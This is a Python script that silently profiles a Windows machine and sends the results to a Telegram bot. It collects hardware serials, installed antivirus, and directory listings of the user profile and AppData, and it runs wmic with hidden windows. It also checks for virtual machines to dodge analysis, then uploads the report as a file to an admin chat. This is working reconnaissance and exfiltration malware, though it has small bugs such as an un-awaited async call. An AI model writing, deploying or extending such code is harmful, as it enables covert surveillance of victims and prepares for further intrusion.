import io
import platform
import psutil
import subprocess
from aiogram import Bot, Dispatcher, types
from aiogram.types import BufferedInputFile
import os
from datetime import date, datetime
import json

def load_data():
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))

        config_path = os.path.join(current_dir, "..", "user.json")
        with open(config_path, "r", encoding="utf-8") as v:
            data = json.load(v)
            return data
    except FileNotFoundError:
        print("i cant found 'user.json'\n")

get = load_data()
TOKEN = get["token_1"]
ADMIN_ID = get["admin"]

bot = Bot(token=TOKEN)
userprofile = os.environ.get('USERPROFILE')
appdata = os.environ.get('APPDATA')

def get_wmic(command):
    try:
        output = subprocess.check_output(f"wmic {command}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        res = output.decode('utf-8', errors='ignore').strip()

        values = []
        for line in res.splitlines():
            if '=' in line:
                val = line.split('=', 1)[1].strip()
                if val: values.append(val)
        return ", ".join(values) if values else "N/A"
    except Exception:
        return "Error"


def get_dir(cmd):
    try:
        output = subprocess.check_output(f"dir {cmd}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return output.decode('cp866', errors='ignore')
    except Exception as edir:
        return str(edir)


mem = psutil.virtual_memory()
b = psutil.sensors_battery()

time_now = datetime.now().strftime("%H:%M:%S")
date_now = date.today()

sinfo_info = (f"OS: {platform.platform()}\n"
              f"Name: {platform.node()}\n"
              f"Arch: {platform.machine()}\n"
              f"Processor: {platform.processor()}\n"
              f"CPU count: {psutil.cpu_count()}\n\n"
              f"Python build: {platform.python_build()}\n"
              f"Compiler: {platform.python_compiler()}\n"
              f"Python version: {platform.python_version()}\n\n"
              f"Memory: {mem.percent}%\n"
              f"Memory total: {mem.total}\n"
              f"Memory used: {mem.used}\n"
              f"Free memory: {mem.free}\n\n"
              f"Battery power: {b.power_plugged}\n"
              f"Battery percent: {b.percent}\n")

wmic_info = (f"Serial Number: {get_wmic("bios get serialnumber /value")}\n"
             f"Disk model: {get_wmic("diskdrive get model, InterfaceType /value")}\n"
             f"Product model: {get_wmic("csproduct get name /value")}\n"
             f"Socket model: {get_wmic("cpu get socketdesignation /value")}\n\n"
             f"Display width: {get_wmic("path win32_VideoController get CurrentHorizontalResolution /value")}\n"
             f"Display height: {get_wmic("path win32_VideoController get CurrentVerticalResolution /value")}\n"
             f"Display refresh rate: {get_wmic("path win32_VideoController get CurrentRefreshRate /value")}\n\n"
             f"GPU: {get_wmic("path win32_VideoController get name /value")}\n"
             f"CPU: {get_wmic("cpu get loadpercentage /value")}%\n"
             f"MotherBoard: {get_wmic("baseboard get product,Manufacturer /value")}\n"
             f"Bios version: {get_wmic("bios get name, releaseDate, version /value")}\n"
             f"All disks: {get_wmic("logicaldisk get caption, freespace, size /value")}\n"
             f"Defender: {get_wmic(r"/namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName, productState /value")}\n")

dir_info = (f"Current Dir: \n{get_dir(" ")}\n\n"
            f"Current User: \n{get_dir(userprofile)}\n\n"
            f"AppData: \n{get_dir(appdata)}\n\n")



def check_vm():
    try:
        output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
        vm_keywords = ["virtual", "vmware", "vbox", "qemu", "hyper-v"]

        for word in vm_keywords:
            if word in output.lower():
                return True
        return False
    except Exception:
        return False


async def run():
    if check_vm():
        await bot.send_message(ADMIN_ID, f"{platform.node}\n{platform.platform}\n\nScript run in VM")
        return
    else:
        try:
            report_text = f"{date_now} | {time_now}\n\n{sinfo_info}\n\n\n{wmic_info}\n\n\n{dir_info}"
            text_buffer = io.BytesIO(report_text.encode('utf-8'))

            sinfo_inf = BufferedInputFile(
                file=text_buffer.getvalue(),
                filename=f"{platform.node()}_info.txt"
            )
            await bot.send_document(ADMIN_ID, document=sinfo_inf)
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"Error\n{e}")


if __name__ == '__main__':
    run()